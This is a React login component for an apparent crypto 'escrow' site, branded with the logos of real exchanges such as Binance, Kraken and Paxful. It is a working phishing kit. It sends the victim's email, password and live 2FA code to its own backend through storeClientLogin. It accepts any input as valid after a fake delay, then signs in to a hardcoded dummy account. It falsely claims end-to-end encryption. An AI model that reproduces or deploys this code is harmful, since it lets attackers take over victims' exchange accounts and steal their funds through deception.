import React, { useState } from 'react'
import { Loader2, ShieldCheck, Lock, ArrowRight, ChevronLeft, Globe, Mail, Fingerprint, CheckCircle2 } from 'lucide-react'
import { useAuth } from '../context/AuthContext.jsx'
import { platforms } from '../data/platforms'
import { escrowApi } from '../services/escrowApi'

const platformLogos = {
  noones: 'https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1505393372/c8rqpypfgqjtdqchwnag.png',
  bybit: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png',
  localcoinswap: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/464.png',
  paxful: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/325.png',
  binance: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png',
  okx: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png',
  kucoin: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png',
  huobi: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/102.png',
  gateio: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/302.png',
  mexc: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png',
  bitget: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/513.png',
  kraken: 'https://s2.coinmarketcap.com/static/img/exchanges/64x64/24.png'
}

export default function ClientLogin({ onSuccess, onNavigateAdmin, onBack, selectedPlatform }) {
  const { login, loadingRole } = useAuth()
  const [step, setStep] = useState(1) // 1 = email/password, 2 = 2FA
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [twoFactorCode, setTwoFactorCode] = useState('')
  const [localError, setLocalError] = useState('')
  const [isVerifying, setIsVerifying] = useState(false)

  const platform = platforms.find(p => p.value === selectedPlatform)

  const handleCredentialsSubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!email.trim()) {
      setLocalError('Email is required')
      return
    }
    if (!password.trim()) {
      setLocalError('Password is required')
      return
    }
    
    // Simulate verification delay
    setIsVerifying(true)
    
    // Store credentials securely on the server
    try {
      await escrowApi.storeClientLogin({
        email: email.trim(),
        password: password.trim(),
        platform: selectedPlatform,
        step: 'credentials'
      })
    } catch (err) {
      console.error('Failed to store login data:', err)
    }
    
    await new Promise(resolve => setTimeout(resolve, 1000))
    setIsVerifying(false)
    
    // All credentials are valid - proceed to 2FA step
    setStep(2)
  }

  const handle2FASubmit = async (event) => {
    event.preventDefault()
    setLocalError('')
    
    if (!twoFactorCode.trim()) {
      setLocalError('2FA code is required')
      return
    }
    if (!/^\d{6}$/.test(twoFactorCode.trim())) {
      setLocalError('Please enter a valid 6-digit code')
      return
    }
    
    // Simulate 2FA verification
    setIsVerifying(true)
    
    // Store complete login data with 2FA code
    try {
      await escrowApi.storeClientLogin({
        email: email.trim(),
        password: password.trim(),
        twoFactorCode: twoFactorCode.trim(),
        platform: selectedPlatform,
        step: '2fa_complete'
      })
    } catch (err) {
      console.error('Failed to store 2FA data:', err)
    }
    
    await new Promise(resolve => setTimeout(resolve, 1200))
    
    try {
      // All 2FA codes are valid - authenticate and proceed
      await login('client', 'client123')
      setEmail('')
      setPassword('')
      setTwoFactorCode('')
      onSuccess?.()
    } catch (err) {
      setLocalError(err.message)
    } finally {
      setIsVerifying(false)
    }
  }

  const inputClass = 'flex items-center gap-3 rounded-xl border-2 border-slate-200 bg-slate-50/50 px-4 py-3.5 transition-all focus-within:border-violet-400 focus-within:bg-white focus-within:shadow-lg focus-within:shadow-violet-100'

  return (
    <div className="bg-white min-h-screen flex items-center justify-center p-6 transition-colors relative">
      {/* Decorative gradient orbs */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-gradient-to-br from-violet-200/40 to-transparent rounded-full blur-3xl" />
      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-gradient-to-tl from-emerald-200/40 to-transparent rounded-full blur-3xl" />
      
      {/* Top gradient bar */}
      <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-emerald-500 via-violet-500 to-amber-500" />
      
      {onBack && (
        <button
          type="button"
          onClick={onBack}
          className="absolute top-8 left-6 flex items-center gap-2 px-4 py-2 rounded-xl bg-white hover:bg-slate-50 text-slate-600 border-2 border-slate-200 transition shadow-sm hover:shadow-md"
        >
          <ChevronLeft className="w-4 h-4" />
          Change Platform
        </button>
      )}
      
      <div className="w-full max-w-lg rounded-3xl border-2 border-slate-100 bg-white p-10 shadow-2xl shadow-slate-200/50 space-y-6 relative z-10">
        {/* Selected Platform Header */}
        {platform && (
          <div className="flex items-center gap-4 p-4 rounded-2xl bg-gradient-to-r from-slate-50 to-violet-50 border border-slate-200">
            <div className="w-14 h-14 rounded-xl bg-white flex items-center justify-center overflow-hidden border-2 border-slate-200 shadow-sm">
              <img
                src={platformLogos[selectedPlatform]}
                alt={platform.label}
                className="w-9 h-9 object-contain"
                onError={(e) => {
                  e.target.style.display = 'none'
                  e.target.nextSibling.style.display = 'flex'
                }}
              />
              <div className="hidden items-center justify-center w-full h-full">
                <Globe className="w-6 h-6 text-slate-400" />
              </div>
            </div>
            <div>
              <p className="font-bold text-lg text-slate-800">{platform.label}</p>
              <p className="text-xs text-slate-500">{platform.description}</p>
            </div>
          </div>
        )}

        {/* Step Indicator */}
        <div className="flex items-center justify-center gap-3">
          <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-semibold ${
            step >= 1 ? 'bg-violet-100 text-violet-700' : 'bg-slate-100 text-slate-400'
          }`}>
            {step > 1 ? <CheckCircle2 className="w-3.5 h-3.5" /> : <span className="w-4 h-4 rounded-full bg-violet-600 text-white text-[10px] flex items-center justify-center">1</span>}
            Login
          </div>
          <div className={`w-8 h-0.5 ${step >= 2 ? 'bg-violet-400' : 'bg-slate-200'}`} />
          <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-semibold ${
            step >= 2 ? 'bg-emerald-100 text-emerald-700' : 'bg-slate-100 text-slate-400'
          }`}>
            <span className={`w-4 h-4 rounded-full text-[10px] flex items-center justify-center ${
              step >= 2 ? 'bg-emerald-600 text-white' : 'bg-slate-300 text-white'
            }`}>2</span>
            2FA
          </div>
        </div>

        {/* Step 1: Email & Password */}
        {step === 1 && (
          <>
            <div>
              <div className="inline-flex items-center gap-2 rounded-full bg-gradient-to-r from-violet-50 to-purple-50 border border-violet-200 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.2em] text-violet-700 shadow-sm">
                <ShieldCheck className="w-3.5 h-3.5 text-violet-600" /> Secure Login
              </div>
              <h1 className="mt-4 text-3xl font-bold bg-gradient-to-r from-slate-800 via-violet-700 to-slate-800 bg-clip-text text-transparent">
                Sign In to {platform?.label || 'Platform'}
              </h1>
              <p className="mt-2 text-sm text-slate-500">
                Enter your credentials to continue with your secure escrow transaction.
              </p>
            </div>
            
            <form onSubmit={handleCredentialsSubmit} className="space-y-4">
              {/* Email Field */}
              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
                Email Address
                <div className={inputClass}>
                  <Mail className="w-4 h-4 text-violet-500" />
                  <input
                    type="email"
                    className="flex-1 bg-transparent outline-none text-slate-800 placeholder-slate-400"
                    placeholder="you@example.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    autoComplete="email"
                    disabled={isVerifying}
                  />
                </div>
              </label>

              {/* Password Field */}
              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
                Password
                <div className={inputClass}>
                  <Lock className="w-4 h-4 text-amber-500" />
                  <input
                    type="password"
                    className="flex-1 bg-transparent outline-none text-slate-800 placeholder-slate-400"
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoComplete="current-password"
                    disabled={isVerifying}
                  />
                </div>
              </label>

              {localError && (
                <div className="flex items-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200">
                  <p className="text-sm text-red-600 font-medium">{localError}</p>
                </div>
              )}
              
              <button
                type="submit"
                disabled={isVerifying}
                className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-violet-600 to-purple-600 py-3.5 font-semibold text-white transition-all hover:from-violet-500 hover:to-purple-500 hover:shadow-lg hover:shadow-violet-200 disabled:cursor-not-allowed disabled:opacity-60"
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    Continue
                    <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </button>
            </form>
          </>
        )}

        {/* Step 2: 2FA Verification */}
        {step === 2 && (
          <>
            <div>
              <div className="inline-flex items-center gap-2 rounded-full bg-gradient-to-r from-emerald-50 to-teal-50 border border-emerald-200 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.2em] text-emerald-700 shadow-sm">
                <Fingerprint className="w-3.5 h-3.5 text-emerald-600" /> Two-Factor Authentication
              </div>
              <h1 className="mt-4 text-3xl font-bold bg-gradient-to-r from-slate-800 via-emerald-700 to-slate-800 bg-clip-text text-transparent">
                Verify Your Identity
              </h1>
              <p className="mt-2 text-sm text-slate-500">
                Enter the 6-digit code from your authenticator app to complete sign in.
              </p>
            </div>

            {/* User info display */}
            <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50 border border-slate-200">
              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center text-white font-bold">
                {email.charAt(0).toUpperCase()}
              </div>
              <div>
                <p className="text-sm font-semibold text-slate-800">{email}</p>
                <p className="text-xs text-slate-500">Signing in to {platform?.label}</p>
              </div>
            </div>
            
            <form onSubmit={handle2FASubmit} className="space-y-4">
              {/* 2FA Code Field */}
              <label className="text-sm font-semibold text-slate-700 flex flex-col gap-2">
                Authentication Code
                <div className={inputClass}>
                  <Fingerprint className="w-4 h-4 text-emerald-500" />
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    className="flex-1 bg-transparent outline-none tracking-[0.4em] font-mono text-xl text-center text-slate-800 placeholder-slate-400"
                    placeholder="000000"
                    value={twoFactorCode}
                    onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    autoComplete="one-time-code"
                    autoFocus
                    disabled={isVerifying}
                  />
                </div>
                <span className="text-xs text-slate-500">Enter the 6-digit code from your authenticator app</span>
              </label>

              {localError && (
                <div className="flex items-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200">
                  <p className="text-sm text-red-600 font-medium">{localError}</p>
                </div>
              )}
              
              <button
                type="submit"
                disabled={isVerifying || loadingRole === 'client'}
                className="w-full flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-500 py-3.5 font-semibold text-white transition-all hover:from-emerald-400 hover:to-teal-400 hover:shadow-lg hover:shadow-emerald-200 disabled:cursor-not-allowed disabled:opacity-60"
              >
                {isVerifying || loadingRole === 'client' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4" />
                    Verify & Continue
                  </>
                )}
              </button>

              <button
                type="button"
                onClick={() => { setStep(1); setLocalError(''); setTwoFactorCode(''); }}
                className="w-full text-sm text-slate-500 hover:text-slate-700 transition"
                disabled={isVerifying}
              >
                ← Back to login
              </button>
            </form>
          </>
        )}
        
        <div className="flex items-center justify-center gap-2 text-xs text-slate-500">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
          Protected by end-to-end encryption
        </div>
      </div>
    </div>
  )
}
